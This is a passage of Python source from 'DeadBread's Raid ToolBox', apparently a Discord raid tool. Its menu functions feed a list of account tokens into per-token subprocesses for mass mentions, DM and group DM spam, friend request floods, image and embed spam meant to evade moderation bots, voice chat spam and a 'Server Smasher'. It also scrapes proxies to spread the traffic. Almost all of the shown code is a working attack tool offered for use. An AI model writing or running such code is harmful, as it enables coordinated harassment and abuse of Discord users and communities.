        tcounter += 1
        number = str(tcounter)
        if sys.platform.startswith('win32'):
            p = subprocess.Popen([winpy,'spammer/massmention.py',token,SERVER,number,useproxies],stdout=open(os.devnull, "w"), stderr=subprocess.STDOUT)
        elif sys.platform.startswith('linux'):
            p = subprocess.Popen([linuxpy,'spammer/massmention.py',token,SERVER,number,useproxies],stdout=open(os.devnull, "w"), stderr=subprocess.STDOUT)
        spawnedpids.append(p.pid)
        time.sleep(0.1)
    currentattacks.append("Mass Mention Spam with "+ str(tcounter) + " tokens.")
    time.sleep(5)
    main(currentattacks,spawnedpids)

def vcspam(currentattacks,spawnedpids):
    clear()
    if sys.platform.startswith('win32'):
        ctypes.windll.kernel32.SetConsoleTitleW("DeadBread's Raid ToolBox | Voice Chat Spammer")
    elif sys.platform.startswith('linux'):
        sys.stdout.write("\x1b]2;DeadBread's Raid ToolBox | Voice Chat Spammer\x07")
    tcounter = 0
    print (colored("Discord VC joiner/spammer.",menucolour))
    print (colored("0: Back",menucolour))
    ytlink = input ('YouTube Link to play: ')
    if ytlink == '0':
        main(currentattacks,spawnedpids)
    chanid = input ('Voice channel ID: ')
    tokencount = input ('Number of tokens to use: ')
    if os.path.isfile('spammer/file.wav'):
        os.remove('spammer/file.wav')
        print ("Removed old .wav.")
    with youtube_dl.YoutubeDL(ydl_opts) as ydl:
        ydl.download([ytlink])
    tcounter = 0
    tokenlist = open("./tokens.txt").read().splitlines()
    for token in tokenlist:
        tcounter += 1
        number = str(tcounter)
        if sys.platform.startswith('win32'):
            p = subprocess.Popen([winpy,'spammer/vcspam.py',token,number,chanid,useproxies],stdout=open(os.devnull, "w"), stderr=subprocess.STDOUT)
        elif sys.platform.startswith('linux'):
            p = subprocess.Popen([linuxpy,'spammer/vcspam.py',token,number,chanid,useproxies],stdout=open(os.devnull, "w"), stderr=subprocess.STDOUT)
        spawnedpids.append(p.pid)
        if number == str(tokencount):
            break
        time.sleep(0.1)
    currentattacks.append("Voice Chat Spam with "+ str(tcounter) + " tokens.")
    time.sleep(5)
    main(currentattacks,spawnedpids)

def dmspam(currentattacks,spawnedpids):
    clear()
    if sys.platform.startswith('win32'):
        ctypes.windll.kernel32.SetConsoleTitleW("DeadBread's Raid ToolBox | DM Spammer")
    elif sys.platform.startswith('linux'):
        sys.stdout.write("\x1b]2;DeadBread's Raid ToolBox | DM Spammer\x07")
    print (colored("Discord user DM spammer.",menucolour))
    print (colored("0: Back",menucolour))
    user = input ("User's ID: ")
    if str(user) == '0':
        main(currentattacks,spawnedpids)
    msgtxt = input ("Text to spam: ")
    tcounter = 0
    tokenlist = open("./tokens.txt").read().splitlines()
    for token in tokenlist:
        tcounter += 1
        number = str(tcounter)
        if sys.platform.startswith('win32'):
            p = subprocess.Popen([winpy,'spammer/dmspammer.py',token,number,msgtxt,user,useproxies],stdout=open(os.devnull, "w"), stderr=subprocess.STDOUT)
        elif sys.platform.startswith('linux'):
            p = subprocess.Popen([linuxpy,'spammer/dmspammer.py',token,number,msgtxt,user,useproxies],stdout=open(os.devnull, "w"), stderr=subprocess.STDOUT)
        spawnedpids.append(p.pid)
    currentattacks.append("DM Spam with "+ str(tcounter) + " tokens.")
    time.sleep(5)
    main(currentattacks,spawnedpids)

def friender(currentattacks,spawnedpids):
    clear()
    if sys.platform.startswith('win32'):
        ctypes.windll.kernel32.SetConsoleTitleW("DeadBread's Raid ToolBox | Friend Request Spammer")
    elif sys.platform.startswith('linux'):
        sys.stdout.write("\x1b]2;DeadBread's Raid ToolBox | Friend Request Spammer\x07")
    print (colored("Discord user mass friender.",menucolour))
    print (colored("0: Back",menucolour))
    userid = input("User's ID: ")
    if str(userid) == '0':
        main(currentattacks,spawnedpids)
    tokenlist = open("tokens.txt").read().splitlines()
    tcounter = 0
    for token in tokenlist:
        tcounter += 1
        number = str(tcounter)
        if sys.platform.startswith('win32'):
            p = subprocess.Popen([winpy,'spammer/friender.py',token,userid,useproxies],stdout=open(os.devnull, "w"), stderr=subprocess.STDOUT)
        elif sys.platform.startswith('linux'):
            p = subprocess.Popen([linuxpy,'spammer/friender.py',token,userid,useproxies],stdout=open(os.devnull, "w"), stderr=subprocess.STDOUT)
    p.wait()
    main(currentattacks,spawnedpids)

def imagespam(currentattacks,spawnedpids):
    clear()
    if sys.platform.startswith('win32'):
        ctypes.windll.kernel32.SetConsoleTitleW("DeadBread's Raid ToolBox | Image Spammer")
    elif sys.platform.startswith('linux'):
        sys.stdout.write("\x1b]2;DeadBread's Raid ToolBox | Image Spammer\x07")
    print (colored("Discord server image spammer.",menucolour))
    print (colored("0: Back",menucolour))
    chan = input ("Channel to spam in: ")
    if str(chan) == '0':
        main(currentattacks,spawnedpids)
    tcounter = 0
    tokenlist = open("tokens.txt").read().splitlines()
    for token in tokenlist:
        tcounter += 1
        number = str(tcounter)
        if sys.platform.startswith('win32'):
            p = subprocess.Popen([winpy,'spammer/imagespam.py',token,number,chan,useproxies],stdout=open(os.devnull, "w"), stderr=subprocess.STDOUT)
        elif sys.platform.startswith('linux'):
            p = subprocess.Popen([linuxpy,'/spammer/imagespamlinux.py',token,number,chan,useproxies],stdout=open(os.devnull, "w"), stderr=subprocess.STDOUT)
        spawnedpids.append(p.pid)
        time.sleep(0.1)
    currentattacks.append("Image Spam with "+ str(tcounter) + " tokens.")
    time.sleep(5)
    main(currentattacks,spawnedpids)

def gamechange(currentattacks,spawnedpids):
    clear()
    if sys.platform.startswith('win32'):
        ctypes.windll.kernel32.SetConsoleTitleW("DeadBread's Raid ToolBox | Playing Status Changer")
    elif sys.platform.startswith('linux'):
        sys.stdout.write("\x1b]2;DeadBread's Raid ToolBox | Playing Status Changer\x07")
    print (colored("Discord game playing status changer.",menucolour))
    print (colored("This will probably slow down some attacks.","blue"))
    print (colored("0: Back",menucolour))
    print ('Name of game to play: ')
    game = input ('Playing ')
    if game == '0':
        main(currentattacks,spawnedpids)
    tokenlist = open("tokens.txt").read().splitlines()
    for token in tokenlist:
        if sys.platform.startswith('win32'):
            p = subprocess.Popen([winpy,'spammer/gamechange.py',token,game,useproxies],stdout=open(os.devnull, "w"), stderr=subprocess.STDOUT)
        elif sys.platform.startswith('linux'):
            p = subprocess.Popen([linuxpy,'spammer/gamechange.py',token,game,useproxies],stdout=open(os.devnull, "w"), stderr=subprocess.STDOUT)
        spawnedpids.append(p.pid)
    currentattacks.append("Playing status change with "+ str(tcounter) + " tokens.")
    time.sleep(5)
    main(currentattacks,spawnedpids)

def asciinick(currentattacks,spawnedpids):
    clear()
    if sys.platform.startswith('win32'):
        ctypes.windll.kernel32.SetConsoleTitleW("DeadBread's Raid ToolBox | Ascii Nickname Changer")
    elif sys.platform.startswith('linux'):
        sys.stdout.write("\x1b]2;DeadBread's Raid ToolBox | Ascii Nickname Changer\x07")
    print (colored("Discord random ascii nickname.",menucolour))
    print (colored("This will probably slow down some attacks.","blue"))
    print (colored("0: Back",menucolour))
    SERVER = input ("Server ID: ")
    if str(SERVER) == '0':
        main(currentattacks,spawnedpids)
    tcounter = 0
    tokenlist = open("tokens.txt").read().splitlines()
    for token in tokenlist:
        tcounter += 1
        number = str(tcounter)
        if sys.platform.startswith('win32'):
            p = subprocess.Popen([winpy,'spammer/nickname.py',token,SERVER,useproxies],stdout=open(os.devnull, "w"), stderr=subprocess.STDOUT)
        elif sys.platform.startswith('linux'):
            p = subprocess.Popen([linuxpy,'spammer/nickname.py',token,SERVER,useproxies],stdout=open(os.devnull, "w"), stderr=subprocess.STDOUT)
        spawnedpids.append(p.pid)
    currentattacks.append("Ascii Nickname Spam with "+ str(tcounter) + " tokens.")
    time.sleep(5)
    main(currentattacks,spawnedpids)

def embedspam(currentattacks,spawnedpids):
    clear()
    if sys.platform.startswith('win32'):
        ctypes.windll.kernel32.SetConsoleTitleW("DeadBread's Raid ToolBox | Embed Spammer")
    elif sys.platform.startswith('linux'):
        sys.stdout.write("\x1b]2;DeadBread's Raid ToolBox | Embed Spammer\x07")
    print (colored("Discord embed spammer.",menucolour))
    print (colored("Will probably bypass some bots that have word and image restrictions.",menucolour))
    print (colored("0: Back",menucolour))
    title = input ("Embed Title: ")
    if title == '0':
        main(currentattacks,spawnedpids)
    author = input ("Embed Author: ")
    iconurl = input ("Author Icon URL: ")
    thumburl = input ("Thumbnail image URL: ")
    footer = input ("Embed Footer Text: ")
    textchan = input ("Text Channel to spam in: ")
    tcounter = 0
    tokenlist = open("tokens.txt").read().splitlines()
    for token in tokenlist:
        tcounter += 1
        number = str(tcounter)
        if sys.platform.startswith('win32'):
            p = subprocess.Popen([winpy,'spammer/embedspam.py',token,title,author,iconurl,thumburl,footer,textchan,useproxies],stdout=open(os.devnull, "w"), stderr=subprocess.STDOUT)
        elif sys.platform.startswith('linux'):
            p = subprocess.Popen([linuxpy,'spammer/embedspam.py',token,title,author,iconurl,thumburl,footer,textchan,useproxies],stdout=open(os.devnull, "w"), stderr=subprocess.STDOUT)
        spawnedpids.append(p.pid)
    currentattacks.append("Embed Spam with "+ str(tcounter) + " tokens.")
    time.sleep(5)
    main(currentattacks,spawnedpids)

def trafficlight(currentattacks,spawnedpids):
    clear()
    if sys.platform.startswith('win32'):
        ctypes.windll.kernel32.SetConsoleTitleW("DeadBread's Raid ToolBox | TrafficLight Status Effect")
    elif sys.platform.startswith('linux'):
        sys.stdout.write("\x1b]2;DeadBread's Raid ToolBox | TrafficLight Status Effect\x07")
    tokenlist = open("tokens.txt").read().splitlines()
    for token in tokenlist:
        if sys.platform.startswith('win32'):
            p = subprocess.Popen([winpy,'spammer/trafficlight.py',token,useproxies],stdout=open(os.devnull, "w"), stderr=subprocess.STDOUT)
        elif sys.platform.startswith('linux'):
            p = subprocess.Popen([linuxpy,'spammer/trafficlight.py',token,useproxies],stdout=open(os.devnull, "w"), stderr=subprocess.STDOUT)
        spawnedpids.append(p.pid)
    currentattacks.append("TrafficLight effect with "+ str(tcounter) + " tokens.")
    time.sleep(3)
    print (colored("Started traffic Light effect.","green"))
    time.sleep(0.5)
    clear()
    print (colored("Started traffic Light effect.","yellow"))
    time.sleep(0.5)
    clear()
    print (colored("Started traffic Light effect.","red"))
    time.sleep(0.5)
    main(currentattacks,spawnedpids)

def rolemassmention(currentattacks,spawnedpids):
    clear()
    if sys.platform.startswith('win32'):
        ctypes.windll.kernel32.SetConsoleTitleW("DeadBread's Raid ToolBox | Role Mass Mentioner")
    elif sys.platform.startswith('linux'):
        sys.stdout.write("\x1b]2;DeadBread's Raid ToolBox | Role Mass Mentioner\x07")
    print (colored("Discord role mass mentioner.",menucolour))
    print (colored("This will spam mention all roles that are mentionable.",menucolour))
    print (colored("0: Back",menucolour))
    SERVER = input('Server ID: ')
    if str(SERVER) == '0':
        main(currentattacks,spawnedpids)
    tcounter = 0
    tokenlist = open("tokens.txt").read().splitlines()
    for token in tokenlist:
        tcounter += 1
        number = str(tcounter)
        if sys.platform.startswith('win32'):
            p = subprocess.Popen([winpy,'spammer/rolemention.py',token,SERVER,number,useproxies],stdout=open(os.devnull, "w"), stderr=subprocess.STDOUT)
        elif sys.platform.startswith('linux'):
            p = subprocess.Popen([linuxpy,'spammer/rolemention.py',token,SERVER,number,useproxies],stdout=open(os.devnull, "w"), stderr=subprocess.STDOUT)
        spawnedpids.append(p.pid)
        time.sleep(0.1)
    currentattacks.append("Role Mass Mention with "+ str(tcounter) + " tokens.")
    time.sleep(5)
    main(currentattacks,spawnedpids)

def cleanup(currentattacks,spawnedpids):
    clear()
    if sys.platform.startswith('win32'):
        ctypes.windll.kernel32.SetConsoleTitleW("DeadBread's Raid ToolBox | Message Cleaner")
    elif sys.platform.startswith('linux'):
        sys.stdout.write("\x1b]2;DeadBread's Raid ToolBox | Message Cleaner\x07")
    print (colored("Clean up messages sent by a token",menucolour))
    print (colored("This will delete all the messages sent by the token.",menucolour))
    print (colored("0: Back",menucolour))
    SERVER = input('Server ID: ')
    if str(SERVER) == '0':
        main(currentattacks,spawnedpids)
    tcounter = 0
    tokenlist = open("tokens.txt").read().splitlines()
    for token in tokenlist:
        tcounter += 1
        number = str(tcounter)
        if sys.platform.startswith('win32'):
            p = subprocess.Popen([winpy,'spammer/cleanup.py',token,SERVER,number,useproxies],stdout=open(os.devnull, "w"), stderr=subprocess.STDOUT)
        elif sys.platform.startswith('linux'):
            p = subprocess.Popen([linuxpy,'spammer/cleanup.py',token,SERVER,number,useproxies],stdout=open(os.devnull, "w"), stderr=subprocess.STDOUT)
        spawnedpids.append(p.pid)
        time.sleep(0.1)
    time.sleep(5)
    main(currentattacks,spawnedpids)

def serversmasher(currentattacks,spawnedpids):
    clear()
    print ("The config file for the Server Smasher is in spammer/smconfig.py, please add token before starting.")
    if sys.platform.startswith('win32'):
        if serversmasherinmainwindow == 1:
            p = subprocess.Popen([winpy,'spammer/serversmasher.py',smversion,menucolour])
            p.wait()
        else:
            subprocess.Popen([winpy,'spammer/serversmasher.py',smversion,menucolour],creationflags=CREATE_NEW_CONSOLE)
    elif sys.platform.startswith('linux'):
        if serversmasherinmainwindow == 1:
            p = subprocess.Popen([linuxpy,'spammer/serversmasher.py',smversion,menucolour])
            p.wait()
        else:
            subprocess.call(['gnome-terminal', '-x', linuxpy,'spammer/serversmasher.py',smversion,menucolour])
    time.sleep(1)
    main(currentattacks,spawnedpids)

def proxyscrape(currentattacks,spawnedpids):
    clear()
    if sys.platform.startswith('win32'):
        ctypes.windll.kernel32.SetConsoleTitleW("DeadBread's Raid ToolBox | Proxy Scraper")
    elif sys.platform.startswith('linux'):
        sys.stdout.write("\x1b]2;DeadBread's Raid ToolBox | Proxy Scraper\x07")
    print (colored("RTB Proxy Scraper.",menucolour))
    print (colored("I recommend that you get enough proxies for the ammount of tokens you have.",menucolour))
    print (colored("0: Back",menucolour))
    amm = input ("Ammount of proxies to scrape: ")
    if str(amm) == '0':
        main(currentattacks,spawnedpids)
    for x in range(int(amm)):
        proxy = collector.get_proxy()
        port = proxy[1]
        proxy = proxy[0]
        proxy = proxy + ":" + port
        print (proxy)
        with open ('proxies.txt','a+') as handle:
            handle.write(proxy+'\n')
    print (colored(str(amm) + " proxies have been scraped.",menucolour))
    input ()
    main(currentattacks,spawnedpids)

def vcjoinspammer(currentattacks,spawnedpids): #wew its here
    clear()
    if sys.platform.startswith('win32'):
        ctypes.windll.kernel32.SetConsoleTitleW("DeadBread's Raid ToolBox | Voice chat join spammer")
    elif sys.platform.startswith('linux'):
        sys.stdout.write("\x1b]2;DeadBread's Raid ToolBox | Voice chat join spammer\x07")
    print (colored("Discord Voice chat join spammer. Joins random voice channels in a server.",menucolour))
    print (colored("0: Back",menucolour))
    SERVER = input ('Server ID: ')
    if str(SERVER) == '0':
        main(currentattacks,spawnedpids)
    tcounter = 0
    tokenlist = open("tokens.txt").read().splitlines()
    for token in tokenlist:
        tcounter += 1
        number = str(tcounter)
        if sys.platform.startswith('win32'):
            p = subprocess.Popen([winpy,'spammer/vcjoinspam.py',token,number,SERVER,useproxies],stdout=open(os.devnull, "w"), stderr=subprocess.STDOUT)
        elif sys.platform.startswith('linux'):
            p = subprocess.Popen([linuxpy,'spammer/vcjoinspam.py',token,number,SERVER,useproxies],stdout=open(os.devnull, "w"), stderr=subprocess.STDOUT)
        spawnedpids.append(p.pid)
        time.sleep(0.1)
    currentattacks.append("Voice chat join and spam with "+ str(tcounter) + " tokens.")
    time.sleep(5)
    main(currentattacks,spawnedpids)

def groupdmspam(currentattacks,spawnedpids):
    clear()
    if sys.platform.startswith('win32'):
        ctypes.windll.kernel32.SetConsoleTitleW("DeadBread's Raid ToolBox | Group DM Spammer")
    elif sys.platform.startswith('linux'):
        sys.stdout.write("\x1b]2;DeadBread's Raid ToolBox | Group DM Spammer\x07")
    print (colored("Discord Group DM message spammer.",menucolour))
    print (colored("0: Back",menucolour))
    group = input ("Group ID: ")
    if str(group) == '0':
        main(currentattacks,spawnedpids)
    msgtxt = input ("Text to spam: ")
    tcounter = 0
    tokenlist = open("tokens.txt").read().splitlines()
    for token in tokenlist:
        tcounter += 1
        number = str(tcounter)
        if sys.platform.startswith('win32'):
            p = subprocess.Popen([winpy,'spammer/groupdmspam.py',token,group,number,msgtxt,useproxies],stdout=open(os.devnull, "w"), stderr=subprocess.STDOUT)
        elif sys.platform.startswith('linux'):
            p = subprocess.Popen([linuxpy,'spammer/groupdmspam.py',token,group,number,msgtxt,useproxies],stdout=open(os.devnull, "w"), stderr=subprocess.STDOUT)
        spawnedpids.append(p.pid)
        time.sleep(0.1)
    currentattacks.append("Group DM spam with "+ str(tcounter) + " tokens.")
    time.sleep(5)
    main(currentattacks,spawnedpids)

def viewcurrentat(currentattacks,spawnedpids):
    clear()
    if sys.platform.startswith('win32'):
        ctypes.windll.kernel32.SetConsoleTitleW("DeadBread's Raid ToolBox | Current Attacks")
    elif sys.platform.startswith('linux'):
        sys.stdout.write("\x1b]2;DeadBread's Raid ToolBox | Current Attacks\x07")
    print (colored("Current Attacks:",menucolour))
    print (colored("---------------------",menucolour))
    for attack in currentattacks:
        print (colored(attack,"green"))
    if currentattacks == []:
        print (colored('None',"green"))
    print (colored("---------------------\nType 'killall' to end all current attacks.",menucolour))
    attackkill = input ()
    if attackkill.lower() == 'killall':
        for pid in spawnedpids:
            if sys.platform.startswith('win32'):
                try:
                    os.kill(int(pid), 9)
                except Exception:
                    pass
            elif sys.platform.startswith('linux'):
                try:
                    os.kill(int(pid), signal.SIGKILL)
                except Exception:
                    pass
        currentattacks = []
        spawnedpids = []
    main(currentattacks,spawnedpids)

def customplugins(currentattacks,spawnedpids):
    clear()
    pluginlist = {}
    pluginfile = []
    pluginfolder = []
    if sys.platform.startswith('win32'):
        ctypes.windll.kernel32.SetConsoleTitleW("DeadBread's Raid ToolBox | Custom Plugins")
    elif sys.platform.startswith('linux'):
        sys.stdout.write("\x1b]2;DeadBread's Raid ToolBox | Custom Plugins\x07")
    pluginno = -1
    print (colored("Installed Plugins:",menucolour))
    print (colored("----------------------",menucolour))
    for root, dirs, files in os.walk("plugins/", topdown=False):
        for folder in dirs:
            try:
                plugdir = os.listdir('plugins/{}/'.format(folder))
            except Exception:
                continue
            for file in plugdir:
                if str(file).startswith("main_"):
                    pluginlist[folder] = file
    for plugin in pluginlist:
        pluginno += 1
        pluginfolder.append(plugin)
        print (str(pluginno) +". "+ plugin)
    for plugin in pluginlist.items():
        pluginfile.append(plugin[1])
    print (colored("----------------------\nb: Back",menucolour))
    print (colored("e: Kill all plugins\nd: Download plugins from Repo",menucolour))
    plug = input ("Choice of plugin: ")
    if plug == 'b':
        main(currentattacks,spawnedpids)
    if plug == 'e':
        pluginpids = open("pluginpids").readlines()
        for pid in pluginpids:
            if sys.platform.startswith('win32'):
                try:
                    os.kill(int(pid), 9)
                except Exception:
                    pass
            elif sys.platform.startswith('linux'):
                try:
                    os.kill(int(pid), signal.SIGKILL)
                except Exception:
                    pass
        os.remove('pluginpids')
        customplugins(currentattacks,spawnedpids)
    if plug == 'd':
        clear()
        down = requests.get("https://github.com/DeadBread76/Raid-Toolbox-Plugins/archive/master.zip")
        with open("plugins/package.zip", "wb") as handle:
            handle.write(down.content)
        shutil.unpack_archive("plugins/package.zip","plugins/")
        os.remove("plugins/package.zip")
        for root, dirs, files in os.walk("plugins/Raid-Toolbox-Plugins-master/", topdown=False):
            for folder in dirs:
                copy_tree("plugins/Raid-Toolbox-Plugins-master/{}/".format(folder), "plugins/{}/".format(folder+"/"))
        shutil.rmtree("plugins/Raid-Toolbox-Plugins-master/")
        print("Downloaded plugins from Repo.")
        input("Press enter to reload plugins")
        customplugins(currentattacks,spawnedpids)
    plugchoice = "{}/{}".format(pluginfolder[int(plug)],pluginfile[int(plug)])
    clear()
    if sys.platform.startswith('win32'):
        p = subprocess.Popen([winpy,'plugins/'+plugchoice,winpy,menucolour])
    elif sys.platform.startswith('linux'):
        p = subprocess.Popen([linuxpy,'plugins/'+plugchoice,linuxpy,menucolour])
    p.wait()
    customplugins(currentattacks,spawnedpids)

def info(currentattacks,spawnedpids):
    clear()
    if sys.platform.startswith('win32'):
        ctypes.windll.kernel32.SetConsoleTitleW("DeadBread's Raid ToolBox | Info")
    elif sys.platform.startswith('linux'):
        sys.stdout.write("\x1b]2;DeadBread's Raid ToolBox | Info\x07")
    print (colored("  _____       _     _   _______          _ ____            ",menucolour))
    print (colored(" |  __ \     (_)   | | |__   __|        | |  _ \           ",menucolour))
    print (colored(" | |__) |__ _ _  __| |    | | ___   ___ | | |_) | _____  __",menucolour))
    print (colored(" |  _  // _` | |/ _` |    | |/ _ \ / _ \| |  _ < / _ \ \/ /",menucolour))
    print (colored(" | | \ \ (_| | | (_| |    | | (_) | (_) | | |_) | (_) >  < ",menucolour))
    print (colored(" |_|  \_\__,_|_|\__,_|    |_|\___/ \___/|_|____/ \___/_/\_\ ",menucolour))
    print (colored("------------------------------------------------------------",menucolour))
    print (colored("                                                            ",menucolour))
    print (colored("https://github.com/DeadBread76/Raid-Toolbox",menucolour2))
    print (colored("                                                            ",menucolour))
    if singlefile == True:
        print (colored("SINGLE FILE MODE ACTIVE",menucolour2))
    if sys.platform.startswith('win32'):
        print (colored("Raid ToolBox version: "+rtbversion,menucolour2))
    elif sys.platform.startswith('linux'):
        print (colored("Raid ToolBox version: "+'L'+rtbversion,menucolour2))
    print (colored("Server Smasher version: "+smversion,menucolour2))
    print (colored("Discord.py version: "+ discord.__version__,menucolour2))
    print (colored("                                                            ",menucolour))
    print (colored("------------------------------------------------------------",menucolour))
    print (colored("Type 'update' to update Raid ToolBox to the latest version.",menucolour2))
    print (colored("Type 'reinstall' to reinstall requirements",menucolour2))
    print (colored("Type 'diag' for diagnostics log.",menucolour2))
    print (colored("------------------------------------------------------------",menucolour))
    inf = input(colored(">",menucolour2))
    if inf == "d":
        print('7RtuZEe')
        input()
        info(currentattacks,spawnedpids)
    elif inf.lower() == 'reinstall':
        if sys.platform.startswith('win32'):
            installation = subprocess.Popen([winpip,'install','-r','requirements.txt','--user'])
        elif sys.platform.startswith('linux'):
            installation = subprocess.Popen([linuxpip,'install','-r','requirements.txt'])
        installation.wait()
        input("Installation Complete.")
        info(currentattacks,spawnedpids)
    elif inf.lower() == 'diag':
        clear()
        if singlefile == True:
            print("Not while Single file mode is active you don't.")
            input()
            info(currentattacks, spawnedpids)
        if sys.platform.startswith('win32'):
            ctypes.windll.kernel32.SetConsoleTitleW("DeadBread's Raid ToolBox | Diagnostics")
        elif sys.platform.startswith('linux'):
            sys.stdout.write("\x1b]2;DeadBread's Raid ToolBox | Diagnostics\x07")
        try:
            import speedtest
        except Exception:
            if sys.platform.startswith('win32'):
                installation = subprocess.Popen([winpip,'install','speedtest-cli','--user'])
            elif sys.platform.startswith('linux'):
                installation = subprocess.Popen([linuxpip,'install','speedtest-cli'])
            installation.wait()
            import speedtest
        clear()
        with open('tokens.txt','r') as handle:
            lines = handle.readlines()
        tcounter = len(lines)
        print ("Running Speedtest...")
        servers = []
        s = speedtest.Speedtest()
        s.get_servers(servers)
        print ("Testing Ping...")
        s.get_best_server()
        print ("Testing Download Speed...")
        s.download()
        print ("Testing Upload Speed...")
        s.upload()
        s.results.share()
        results_dict = s.results.dict()
        d = results_dict["download"]
        u = results_dict["upload"]
        p = results_dict["ping"]
        print("Checking if CloudFlare Banned...")
        cloudcheck = requests.get("https://discordapp.com/api/v6/invite/DEADBREAD")
        try:
            json.loads(cloudcheck.content)
            banned = False
        except Exception:
            banned = True
        clear()
        print('Download Speed: {:.2f} Kb/s'.format(d / 1024))
        print('Upload Speed: {:.2f} Kb/s'.format(u / 1024))
        print('Ping: {}'.format(p))
        print("CloudFlare Banned: {}".format(banned))
        if banned == True:
            print("You are CloudFlare banned.\n This means the Joiner function and Regular Checker will not work. (So please don't come to my Discord server and complain about the joiner not working.)")
        now = datetime.datetime.now()
        with open ("Diagnostics" + str(now.strftime("%d%m%Y%H%M%S"))+".txt", 'w+') as handle:
            handle.write("Raid Toolbox Diagnostics "+str(now.strftime("%d/%m/%Y %H:%M:%S"))+"\n")
            handle.write("=====================================================\n")
            handle.write("RTB VERSION: " + rtbversion + "\n")
            handle.write("SM VERSION: " + smversion + "\n")
            handle.write("AMMOUNT OF TOKENS LOADED: " + str(tcounter) + "\n")
            handle.write("CloudFlare Banned: {}".format(banned) + "\n")
            handle.write("---------------\n")
            handle.write("Python Info:\n\n")
            handle.write("Python Version: " + sys.version+"\n")
            handle.write("Discord.py version: " + discord.__version__ + "\n")
            handle.write("---------------\n")
            handle.write("OS info:\n\n")
            handle.write("Platform: " + platform.platform()+"\n")
            handle.write("Processor: " + platform.processor()+"\n")
            handle.write("---------------\n")
            handle.write("SpeedTest Results: \n\n")
            handle.write('Download Speed: {:.2f} Kb/s\n'.format(d / 1024))
            handle.write('Upload Speed: {:.2f} Kb/s\n'.format(u / 1024))
            handle.write('Ping: {}\n'.format(p))
            handle.write("---------------\n")
            handle.write("RTB Dump:\n\n")
            handle.write(menucolour+"\n")
            handle.write(useproxies+"\n")
            plugindir = os.listdir('plugins/')
            for plugin in plugindir:
                handle.write(plugin+"\n")
            for attack in currentattacks:
                handle.write(attack+"\n")
            for pid in spawnedpids:
                handle.write(str(pid)+"\n")
            handle.write("---------------\n")
        print ("Diagnostics Written to file.")
        input()
    elif inf.lower() == 'update':
        clear()
        u = input("Are you sure you want to update?(Y/N)\nBe sure to backup your config files.\n")
        if u.lower() == 'y':
            clear()
            @animation.wait(colored('Downloading update for Raid ToolBox, Please Wait ',menucolour))
            def run_update():
                if sys.platform.startswith('win32'):
                    ctypes.windll.kernel32.SetConsoleTitleW("DeadBread's Raid ToolBox | Updating...")
                elif sys.platform.startswith('linux'):
                    sys.stdout.write("\x1b]2;DeadBread's Raid ToolBox | Updating...\x07")
                update = requests.get('https://github.com/DeadBread76/Raid-Toolbox/archive/master.zip')
                clear()
                print(colored("Update has been downloaded, Installing...",menucolour))
                return update
            update = run_update()
            with open("update.zip", "wb") as handle:
                handle.write(update.content)
            try:
                shutil.copy("config.py", "config_old.py")
                shutil.copy("spammer/smconfig.py", "smconfig_old.py")
            except Exception:
                pass
            try:
                shutil.unpack_archive("update.zip")
                copy_tree("Raid-Toolbox-master/", ".")
                os.remove("update.zip")
                shutil.rmtree("Raid-Toolbox-master/")
                print ("Update complete, exiting.")
            except Exception as e:
                print("Error Updating, {}".format(e))
            time.sleep(3)
            sys.exit()
        else:
            info(currentattacks,spawnedpids)
    main(currentattacks,spawnedpids)

def tools(currentattacks,spawnedpids):
    clear()
    if sys.platform.startswith('win32'):
        ctypes.windll.kernel32.SetConsoleTitleW("DeadBread's Raid ToolBox | More Options")
    elif sys.platform.startswith('linux'):
        sys.stdout.write("\x1b]2;DeadBread's Raid ToolBox | Tools\x07")
    print (colored("Raid Toolbox Tools",menucolour))
    print (colored("-------------------",menucolour))
    print (colored("0.  Return to menu",menucolour))
    print (colored("1.  HypeSquad House Changer",menucolour))
    print (colored("2.  Avatar Changer",menucolour))
    print (colored("3.  Token Cleaner",menucolour))
    print (colored("4.  Quick Checker",menucolour))
    print (colored("5.  Nickname Changer",menucolour))
    print (colored("6.  Widget Joiner",menucolour))
    choice = input('Selection: ')
    if int(choice) == 0:
        main(currentattacks,spawnedpids)
    elif int(choice) == 1:
        clear()
        if sys.platform.startswith('win32'):
            ctypes.windll.kernel32.SetConsoleTitleW("DeadBread's Raid ToolBox | HypeSquad Changer")
        elif sys.platform.startswith('linux'):
            sys.stdout.write("\x1b]2;DeadBread's Raid ToolBox | HypeSquad Changer\x07")
        print (colored("1. Bravery",menucolour))
        print (colored("2. Brilliance",menucolour))
        print (colored("3. Ballance",menucolour))
        choice = input('Selection: ')
        tokenlist = open("tokens.txt").read().splitlines()
        for token in tokenlist:
            if sys.platform.startswith('win32'):
                p = subprocess.Popen([winpy,'tools/hypesquad.py',token,choice],stdout=open(os.devnull, "w"), stderr=subprocess.STDOUT)
            elif sys.platform.startswith('linux'):
                p = subprocess.Popen([linuxpy,'tools/hypesquad.py',token,choice],stdout=open(os.devnull, "w"), stderr=subprocess.STDOUT)
        p.wait()
        tools(currentattacks,spawnedpids)
    elif int(choice) == 2:
        Tk().withdraw()
        clear()
        if sys.platform.startswith('win32'):
            ctypes.windll.kernel32.SetConsoleTitleW("DeadBread's Raid ToolBox | Avatar Changer")
        elif sys.platform.startswith('linux'):
            sys.stdout.write("\x1b]2;DeadBread's Raid ToolBox | Avatar Changer\x07")
        avatar = askopenfilename(initialdir = os.getcwd(),title = "Select avatar to change")
        if avatar == "":
            tools(currentattacks,spawnedpids)
        tokenlist = open("tokens.txt").read().splitlines()
        for token in tokenlist:
            if sys.platform.startswith('win32'):
                p = subprocess.Popen([winpy,'tools/avatarchange.py',token,avatar],stdout=open(os.devnull, "w"), stderr=subprocess.STDOUT)
            elif sys.platform.startswith('linux'):
                p = subprocess.Popen([linuxpy,'tools/avatarchange.py',token,avatar],stdout=open(os.devnull, "w"), stderr=subprocess.STDOUT)
        time.sleep(5)
        tools(currentattacks,spawnedpids)
    elif int(choice) == 3:
        clear()
        if sys.platform.startswith('win32'):
            ctypes.windll.kernel32.SetConsoleTitleW("DeadBread's Raid ToolBox | Token Cleaner")
        elif sys.platform.startswith('linux'):
            sys.stdout.write("\x1b]2;DeadBread's Raid ToolBox | Token Cleaner\x07")
        print (colored("Token Cleaner: Leaves every server that the token is on, making it faster to login to.",menucolour))
        choice = input("Clean Tokens?(Y/N): ")
        if choice.lower() == 'y':
            tokenlist = open("tokens.txt").read().splitlines()
            for token in tokenlist:
                if sys.platform.startswith('win32'):
                    p = subprocess.Popen([winpy,'tools/cleaner.py',token,choice],stdout=open(os.devnull, "w"), stderr=subprocess.STDOUT)
                elif sys.platform.startswith('linux'):
